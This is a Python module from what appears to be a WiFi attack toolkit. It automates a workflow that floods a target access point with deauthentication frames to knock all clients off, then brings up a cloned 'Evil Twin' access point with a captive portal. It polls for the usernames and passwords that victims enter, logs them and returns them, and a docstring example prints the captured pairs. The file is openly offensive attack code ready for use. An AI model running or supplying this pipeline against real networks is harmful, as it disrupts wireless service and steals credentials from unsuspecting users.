"""Deauth → Evil Twin → Credential Capture workflow.

Automated pipeline that deauthenticates clients from a target AP,
spins up an Evil Twin, and captures credentials through a captive portal.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Optional

from wifi_aio.automation.workflow_engine import (
    ErrorStrategy,
    WorkflowEngine,
    WorkflowResult,
    WorkflowStep,
)
from wifi_aio.exceptions import (
    AutomationError,
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
)

logger = logging.getLogger(__name__)


@dataclass
class DeauthEvilTwinCaptureConfig:
    """Configuration for the DeauthEvilTwinCapture workflow.

    Attributes:
        monitor_interface: Monitor-mode interface for deauth.
        ap_interface: Interface for the Evil Twin AP.
        internet_interface: Interface with internet access.
        target_bssid: BSSID of the target AP.
        target_channel: Channel of the target AP.
        target_ssid: SSID to clone for the Evil Twin.
        deauth_duration: Seconds to send deauth frames.
        deauth_delay: Delay between deauth frames.
        evil_twin_channel: Channel for the rogue AP.
        evil_twin_gateway: Gateway IP for DHCP.
        dhcp_range_start: Start of DHCP range.
        dhcp_range_end: End of DHCP range.
        portal_port: HTTP port for the captive portal.
        capture_duration: Seconds to run the Evil Twin before stopping.
        capture_file: Path to store captured credentials.
        portal_html: Custom HTML for the captive portal.
    """

    monitor_interface: str = "wlan0mon"
    ap_interface: str = "wlan0"
    internet_interface: str = "eth0"
    target_bssid: str = ""
    target_channel: int = 6
    target_ssid: str = "FreeWiFi"
    deauth_duration: float = 30.0
    deauth_delay: float = 0.1
    evil_twin_channel: int = 6
    evil_twin_gateway: str = "10.0.0.1"
    dhcp_range_start: str = "10.0.0.10"
    dhcp_range_end: str = "10.0.0.50"
    portal_port: int = 80
    capture_duration: float = 300.0
    capture_file: str = "/tmp/wifiaio_credentials.json"
    portal_html: str = ""


@dataclass
class DeauthEvilTwinCaptureResult:
    """Outcome of the DeauthEvilTwinCapture workflow.

    Attributes:
        success: Whether at least one credential was captured.
        credentials: List of captured credential dicts.
        deauth_stats: Deauth injection statistics.
        evil_twin_started: Whether the Evil Twin AP started.
        capture_duration: Actual capture duration in seconds.
        elapsed: Total wall-clock seconds.
    """

    success: bool = False
    credentials: list[dict[str, Any]] = field(default_factory=list)
    deauth_stats: dict[str, Any] = field(default_factory=dict)
    evil_twin_started: bool = False
    capture_duration: float = 0.0
    elapsed: float = 0.0


class DeauthEvilTwinCapture:
    """Deauth → Evil Twin → Credential Capture workflow.

    Steps:
      1. Deauthenticate clients from the target AP.
      2. Start an Evil Twin AP with a captive portal.
      3. Capture credentials from connecting clients.
      4. Stop the Evil Twin and clean up.

    Example::

        workflow = DeauthEvilTwinCapture(
            config=DeauthEvilTwinCaptureConfig(
                target_bssid="AA:BB:CC:DD:EE:FF",
                target_ssid="TargetNetwork",
                target_channel=6,
            )
        )
        result = workflow.run()
        for cred in result.credentials:
            print(f"{cred['username']}:{cred['password']}")
    """

    def __init__(self, config: Optional[DeauthEvilTwinCaptureConfig] = None) -> None:
        self.config = config or DeauthEvilTwinCaptureConfig()
        self._engine = WorkflowEngine(name="deauth_eviltwin_capture")

    def _build_engine(self) -> WorkflowEngine:
        engine = WorkflowEngine(name="deauth_eviltwin_capture")
        engine.set_context("config", self.config)

        # Step 1: Deauth
        engine.add_step(WorkflowStep(
            name="deauth",
            action=self._step_deauth,
            on_error=ErrorStrategy.CONTINUE,
            timeout=self.config.deauth_duration + 10,
        ))

        # Step 2: Start Evil Twin
        engine.add_step(WorkflowStep(
            name="start_evil_twin",
            action=self._step_start_evil_twin,
            on_error=ErrorStrategy.STOP,
            timeout=30.0,
        ))

        # Step 3: Wait and capture
        engine.add_step(WorkflowStep(
            name="capture_credentials",
            action=self._step_capture_credentials,
            condition=lambda ctx: ctx.get("evil_twin_started", False),
            on_error=ErrorStrategy.CONTINUE,
            timeout=self.config.capture_duration + 10,
        ))

        # Step 4: Stop Evil Twin (always runs, with rollback)
        engine.add_step(WorkflowStep(
            name="stop_evil_twin",
            action=self._step_stop_evil_twin,
            on_error=ErrorStrategy.CONTINUE,
            rollback=self._step_stop_evil_twin,
        ))

        return engine

    # ── Steps ──────────────────────────────────────────────────────────

    def _step_deauth(self, ctx: dict[str, Any]) -> dict[str, Any]:
        """Send deauthentication frames to target clients."""
        from wifi_aio.core.deauth_engine import DeauthEngine

        cfg: DeauthEvilTwinCaptureConfig = ctx["config"]
        engine = DeauthEngine(interface=cfg.monitor_interface)

        stats = engine.continuous_deauth(
            target_bssid=cfg.target_bssid,
            client_mac="FF:FF:FF:FF:FF:FF",
            delay=cfg.deauth_delay,
            duration=cfg.deauth_duration,
        )

        stats_dict = stats.to_dict()
        ctx["deauth_stats"] = stats_dict
        logger.info(
            "Deauth complete: %d frames sent", stats_dict.get("frames_sent", 0)
        )
        return stats_dict

    def _step_start_evil_twin(self, ctx: dict[str, Any]) -> dict[str, Any]:
        """Start the Evil Twin access point."""
        from wifi_aio.core.evil_twin import EvilTwin

        cfg: DeauthEvilTwinCaptureConfig = ctx["config"]

        evil_twin = EvilTwin(
            interface=cfg.ap_interface,
            internet_interface=cfg.internet_interface,
            ssid=cfg.target_ssid,
            channel=cfg.evil_twin_channel,
            gateway_ip=cfg.evil_twin_gateway,
            dhcp_range_start=cfg.dhcp_range_start,
            dhcp_range_end=cfg.dhcp_range_end,
            portal_port=cfg.portal_port,
            capture_file=cfg.capture_file,
        )

        if cfg.portal_html:
            evil_twin.set_portal_html(cfg.portal_html)

        evil_twin.start()
        ctx["evil_twin"] = evil_twin
        ctx["evil_twin_started"] = True
        logger.info("Evil Twin started with SSID %s", cfg.target_ssid)

        return {"ssid": cfg.target_ssid, "gateway": cfg.evil_twin_gateway}

    def _step_capture_credentials(self, ctx: dict[str, Any]) -> list[dict[str, Any]]:
        """Wait for credential capture during the configured duration."""
        from wifi_aio.core.evil_twin import EvilTwin

        cfg: DeauthEvilTwinCaptureConfig = ctx["config"]
        evil_twin: EvilTwin = ctx["evil_twin"]

        start = time.time()
        logger.info(
            "Waiting for credentials (%.0f seconds)...", cfg.capture_duration
        )

        # Poll for credentials until duration expires
        captured: list[dict[str, Any]] = []
        while (time.time() - start) < cfg.capture_duration:
            creds = evil_twin.get_credentials()
            new_creds = [c.to_dict() for c in creds[len(captured):]]
            if new_creds:
                captured.extend(new_creds)
                for c in new_creds:
                    logger.info(
                        "Credential captured: username=%s",
                        c.get("username", "(none)"),
                    )
            time.sleep(5)

        ctx["captured_credentials"] = captured
        logger.info("Captured %d credentials total", len(captured))
        return captured

    def _step_stop_evil_twin(self, ctx: dict[str, Any]) -> dict[str, Any]:
        """Stop the Evil Twin and collect results."""
        evil_twin = ctx.get("evil_twin")
        if evil_twin is not None:
            try:
                evil_twin.stop()
                logger.info("Evil Twin stopped")
            except Exception as exc:
                logger.error("Error stopping Evil Twin: %s", exc)

            # Collect final credentials
            final_creds = [c.to_dict() for c in evil_twin.get_credentials()]
            ctx["captured_credentials"] = final_creds

        ctx["evil_twin_started"] = False
        return {"stopped": True}

    # ── Public API ─────────────────────────────────────────────────────

    def run(self) -> DeauthEvilTwinCaptureResult:
        """Execute the full deauth → Evil Twin → capture pipeline.

        Returns:
            DeauthEvilTwinCaptureResult with captured credentials.
        """
        start = time.time()
        self._engine = self._build_engine()

        # Ensure cleanup always runs
        try:
            wf_result: WorkflowResult = self._engine.run()
        finally:
            evil_twin = self._engine.get_context("evil_twin")
            if evil_twin is not None:
                try:
                    evil_twin.stop()
                except Exception:
                    pass

        creds = self._engine.get_context("captured_credentials", [])

        result = DeauthEvilTwinCaptureResult(
            success=len(creds) > 0,
            credentials=creds,
            deauth_stats=self._engine.get_context("deauth_stats", {}),
            evil_twin_started=self._engine.get_context("evil_twin_started", False),
            capture_duration=self.config.capture_duration,
            elapsed=time.time() - start,
        )

        return result

    def __repr__(self) -> str:
        return (
            f"DeauthEvilTwinCapture(target={self.config.target_ssid!r}, "
            f"bssid={self.config.target_bssid!r})"
        )
